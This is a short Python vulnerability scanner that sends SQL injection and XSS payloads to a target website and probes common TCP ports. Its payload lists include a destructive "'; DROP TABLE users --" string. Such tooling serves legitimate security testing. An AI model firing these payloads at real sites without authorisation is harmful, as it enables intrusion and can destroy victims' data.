## pip install requests beautifulsoup4

import requests
from bs4 import BeautifulSoup
import socket
import sys

# Common SQL injection payloads
SQLI_PAYLOADS = ["'", '"', " OR 1=1 --", "' OR '1'='1", "'; DROP TABLE users --"]

# Common XSS payloads
XSS_PAYLOADS = ["<script>alert('XSS')</script>", '"><img src=x onerror=alert(1)>']

def check_sqli(url):
    """Checks if a website is vulnerable to SQL Injection."""
    print("[+] Testing for SQL Injection...")
    for payload in SQLI_PAYLOADS:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)

        if "SQL syntax" in response.text or "mysql_fetch" in response.text:
            print(f"[!] SQL Injection vulnerability detected: {test_url}")
            return True
    print("[-] No SQL Injection detected.")
    return False

def check_xss(url):
    """Checks if a website is vulnerable to XSS attacks."""
    print("[+] Testing for XSS...")
    for payload in XSS_PAYLOADS:
        test_url = f"{url}?q={payload}"
        response = requests.get(test_url)
        if payload in response.text:
            print(f"[!] XSS vulnerability detected: {test_url}")
            return True
    print("[-] No XSS vulnerabilities found.")
    return False

def scan_open_ports(target, ports=[21, 22, 80, 443, 3306]):
    """Scans common ports on the target for open services."""
    print(f"[+] Scanning {target} for open ports...")
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                print(f"[!] Port {port} is open.")
                open_ports.append(port)
            s.close()
        except socket.error:
            pass
    if not open_ports:
        print("[-] No open ports detected.")
    return open_ports

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python vuln_scanner.py <target-website> <target-ip>")
        sys.exit(1)

    website = sys.argv[1]
    target_ip = sys.argv[2]

    check_sqli(website)
    check_xss(website)
    scan_open_ports(target_ip)
